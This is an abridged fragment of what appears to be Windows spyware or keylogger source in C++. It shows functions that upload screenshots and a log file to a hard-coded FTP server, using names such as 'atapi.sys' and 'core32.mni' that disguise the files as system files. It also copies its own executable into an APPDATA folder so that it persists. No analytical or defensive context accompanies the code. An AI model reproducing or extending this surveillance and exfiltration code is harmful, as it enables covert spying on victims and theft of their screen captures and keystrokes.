...
void userpath() {
	...
	GetEnvironmentVariable(L"APPDATA", LPWSTR(szDir), 259);
...
void ftp_scrshot_send() {
	...
	if (hInternet == NULL) {
		...
		hFtpSession = InternetConnect(hInternet, L"192.168.8.2", 2121, NULL, NULL, INTERNET_SERVICE_FTP, 0, 0);
		...
		if (hFtpSession == NULL) {
			...
			if (!FtpPutFile(hFtpSession, L"core32.mni", L"hacks/sc/dc.jpg", FTP_TRANSFER_TYPE_BINARY, 0)) {
				log_error_file << "Error:" << GetLastError();
			}
		}
	}
...
void ftplogsend() {
	...
	if (hInternet == NULL) {
		...
		if (hFtpSession == NULL) {
			...
			if (!FtpPutFile(hFtpSession, L"atapi.sys", L"hacks/hacks.txt", FTP_TRANSFER_TYPE_BINARY, 0)) {
				log_error_file << "Error:" << GetLastError();
				log_error_file.close();
			}
		}
...
void AutoCopy() {
	...
	char my_name[260];
	GetModuleFileName(GetModuleHandle(0), LPWSTR(my_name), 260);//name of running process
	string f_my = my_name;
	CreateDirectory(LPCWSTR(f_path.c_str()), NULL);
	CopyFile(LPCWSTR(f_my.c_str()), LPCWSTR(f_name.c_str()), FALSE);
